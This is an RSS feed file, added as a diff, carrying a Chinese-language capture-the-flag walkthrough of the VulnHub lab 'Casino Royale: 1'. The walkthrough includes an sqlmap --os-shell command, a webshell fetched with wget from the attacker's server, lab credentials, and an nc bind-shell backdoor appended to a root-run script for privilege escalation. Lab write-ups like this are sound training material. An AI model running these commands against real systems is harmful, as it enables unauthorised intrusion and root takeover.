@@ -1,0 +1,145 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Casino on Ca1s1&#39;Blog</title>
+    <link>https://vuln.top/tags/casino/</link>
+    <description>Recent content in Casino on Ca1s1&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 27 Feb 2019 11:24:30 +0800</lastBuildDate><atom:link href="https://vuln.top/tags/casino/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Casino Royale: 1</title>
+      <link>https://vuln.top/posts/casino/</link>
+      <pubDate>Wed, 27 Feb 2019 11:24:30 +0800</pubDate>
+      
+      <guid>https://vuln.top/posts/casino/</guid>
+      <description>&lt;h2 id=&#34;难度&#34;&gt;难度：&lt;/h2&gt;
+&lt;p&gt;Intermediate&lt;/p&gt;
+&lt;h2 id=&#34;关于&#34;&gt;关于：&lt;/h2&gt;
+&lt;p&gt;Will you gain your status as a 00 agent?&lt;/p&gt;
+&lt;p&gt;题目地址：https://www.vulnhub.com/entry/casino-royale-1,287/#&lt;/p&gt;
+&lt;h2 id=&#34;flags&#34;&gt;Flags:&lt;/h2&gt;
+&lt;p&gt;您的目标是获取root和Flag is /root/flag/flag.sh&lt;/p&gt;
+&lt;h2 id=&#34;write-up&#34;&gt;Write Up：&lt;/h2&gt;
+&lt;h3 id=&#34;0x01-获取root&#34;&gt;0x01 获取root&lt;/h3&gt;
+&lt;p&gt;1.通过nmap扫描靶机端口版本，发现存在四个端口：21、25、80、8081
+&lt;code&gt;nmap -sV x.x.x.x&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303101922.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;2.我们从80端口入手，首先查看网页的源代码并无发现线索，其次对80端口进行目录爆破找到一个phpmyadmin的登陆页面和一个install
+&lt;code&gt;dirb [url]&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303101950.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;3.我们开打install页面出现这样一个界面，点击cliek to start install 后页面报错
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102013.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;4.存在install页面说明网站肯定存在这个cms，我们查找相关cms版本信息并获取到源代码且存在一个exp漏洞
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102035.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;5.翻开源代码后台路径是&lt;code&gt;pokeradmin&lt;/code&gt;，并且发现登陆处并且未做sql注入防护
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102104.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;6.直接使用sqlmap跑取账户密码后getshell
+&lt;code&gt;sqlmap.py -u &#39;http://192.168.235.140:80/pokeradmin/&#39; --data=&#39;op=adminlogin&amp;amp;username=admin&amp;amp;password=admin&#39; --level=5 --risk=3 --os-shell &lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102132.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102153.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;7.将kali开一个apache把一句话放在/var/www/html中，然后在靶机的shell中运行wget
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102217.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;8.打开中国蚁剑或中国菜刀（效果是一样的）配置如下
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102237.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;9.getshell后我们先将数据库的账户密码保存下来
+&lt;code&gt;valenka:11archives11!&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102311.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;10.在一段查看后没有发现有价值的信息，查看8081端口，主页面有一个Run Data Collect的按钮，点击后访问到collect.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102433.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;11.因为我们已经拿到www-data的权限了所以我们可以通过find来查找collect.php，找到8081端口的主目录在/opt/casino-royale/
+&lt;code&gt;find / -name [name]&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102712.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;12.进入8081端口主目录后查看文件权限
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102653.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;13.查看权限后发现只有&lt;code&gt;casino-data-collection.py&lt;/code&gt;这个文件我可以修改，cat查看文件内容，python文件打开了&lt;code&gt;user-data.log&lt;/code&gt;继续查看里面内容与collect.php内容一样
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102742.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;14.继续查看&lt;code&gt;collect.php&lt;/code&gt;，基本了解程序大概的过程和出题人的思路，&lt;code&gt;collect.php&lt;/code&gt;为root权限只可读所以不能更改但是执行的&lt;code&gt;casino-data-collection.py&lt;/code&gt;为www-data组所以可以修改，而&lt;code&gt;casino-data-collection.py&lt;/code&gt;打开了&lt;code&gt;user-data.log&lt;/code&gt;所以php读到了log的内容，所以我们只要修改python文件即可获取到le的权限
+解题思路：在python文件中通过os模块执行系统命令返回nc拿到le权限
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102801.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102818.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;15.修改python后，再在浏览器重新打开页面靶机会开启一个带bash的1111端口，使用攻击机的nc连接,获取到le的权限
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102836.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102907.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;16.但是这是一个半交互式的页面无法切换账户，通过查阅资料可以通过python调用本地shell&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34; &amp;gt; /tmp/asdf.py
+
+python /tmp/asdf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102931.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102958.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;难度&#34;&gt;难度：&lt;/h2&gt;
+&lt;p&gt;Intermediate&lt;/p&gt;
+&lt;h2 id=&#34;关于&#34;&gt;关于：&lt;/h2&gt;
+&lt;p&gt;Will you gain your status as a 00 agent?&lt;/p&gt;
+&lt;p&gt;题目地址：https://www.vulnhub.com/entry/casino-royale-1,287/#&lt;/p&gt;
+&lt;h2 id=&#34;flags&#34;&gt;Flags:&lt;/h2&gt;
+&lt;p&gt;您的目标是获取root和Flag is /root/flag/flag.sh&lt;/p&gt;
+&lt;h2 id=&#34;write-up&#34;&gt;Write Up：&lt;/h2&gt;
+&lt;h3 id=&#34;0x01-获取root&#34;&gt;0x01 获取root&lt;/h3&gt;
+&lt;p&gt;1.通过nmap扫描靶机端口版本，发现存在四个端口：21、25、80、8081
+&lt;code&gt;nmap -sV x.x.x.x&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303101922.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;2.我们从80端口入手，首先查看网页的源代码并无发现线索，其次对80端口进行目录爆破找到一个phpmyadmin的登陆页面和一个install
+&lt;code&gt;dirb [url]&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303101950.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;3.我们开打install页面出现这样一个界面，点击cliek to start install 后页面报错
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102013.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;4.存在install页面说明网站肯定存在这个cms，我们查找相关cms版本信息并获取到源代码且存在一个exp漏洞
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102035.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;5.翻开源代码后台路径是&lt;code&gt;pokeradmin&lt;/code&gt;，并且发现登陆处并且未做sql注入防护
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102104.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;6.直接使用sqlmap跑取账户密码后getshell
+&lt;code&gt;sqlmap.py -u &#39;http://192.168.235.140:80/pokeradmin/&#39; --data=&#39;op=adminlogin&amp;amp;username=admin&amp;amp;password=admin&#39; --level=5 --risk=3 --os-shell &lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102132.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102153.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;7.将kali开一个apache把一句话放在/var/www/html中，然后在靶机的shell中运行wget
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102217.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;8.打开中国蚁剑或中国菜刀（效果是一样的）配置如下
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102237.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;9.getshell后我们先将数据库的账户密码保存下来
+&lt;code&gt;valenka:11archives11!&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102311.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;10.在一段查看后没有发现有价值的信息，查看8081端口，主页面有一个Run Data Collect的按钮，点击后访问到collect.php&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102433.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;11.因为我们已经拿到www-data的权限了所以我们可以通过find来查找collect.php，找到8081端口的主目录在/opt/casino-royale/
+&lt;code&gt;find / -name [name]&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102712.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;12.进入8081端口主目录后查看文件权限
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102653.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;13.查看权限后发现只有&lt;code&gt;casino-data-collection.py&lt;/code&gt;这个文件我可以修改，cat查看文件内容，python文件打开了&lt;code&gt;user-data.log&lt;/code&gt;继续查看里面内容与collect.php内容一样
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102742.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;14.继续查看&lt;code&gt;collect.php&lt;/code&gt;，基本了解程序大概的过程和出题人的思路，&lt;code&gt;collect.php&lt;/code&gt;为root权限只可读所以不能更改但是执行的&lt;code&gt;casino-data-collection.py&lt;/code&gt;为www-data组所以可以修改，而&lt;code&gt;casino-data-collection.py&lt;/code&gt;打开了&lt;code&gt;user-data.log&lt;/code&gt;所以php读到了log的内容，所以我们只要修改python文件即可获取到le的权限
+解题思路：在python文件中通过os模块执行系统命令返回nc拿到le权限
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102801.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102818.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;15.修改python后，再在浏览器重新打开页面靶机会开启一个带bash的1111端口，使用攻击机的nc连接,获取到le的权限
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102836.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102907.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;16.但是这是一个半交互式的页面无法切换账户，通过查阅资料可以通过python调用本地shell&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34; &amp;gt; /tmp/asdf.py
+
+python /tmp/asdf.py
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102931.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303102958.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;17.在获取到le的交互式shell后尝试第九步中valenka的账户密码登录。成功登陆但是先切回le，exit退出
+&lt;code&gt;valenka:11archives11!&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303103017.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;18.查看run.sh，并尝试运行&lt;code&gt;mi6_detect_test&lt;/code&gt;这个程序，发现与run.sh中的内容相同，我猜测&lt;code&gt;mi6_detect_test&lt;/code&gt;就是将run.sh运行
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303103048.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303103109.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;18.&lt;code&gt;mi6_detect_test&lt;/code&gt;为root所以我们通过echo命令把后门写入run.sh在运行mi6既可获取到root权限
+&lt;code&gt;echo &amp;quot;nc -lvvp 1234 -t -e /bin/bash&amp;quot; &amp;gt;&amp;gt; run.sh &lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303103129.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303103145.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;19.成功监听端口，攻击机nc连接靶机，并getflag
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210303103207.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;难点总结：
+1.python半交互式切换到全交互式
+2.mi6_detect_test和run.sh程序的关联
+3.理清这几个程序之间的关系
+4.无法通过内核漏洞提权&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
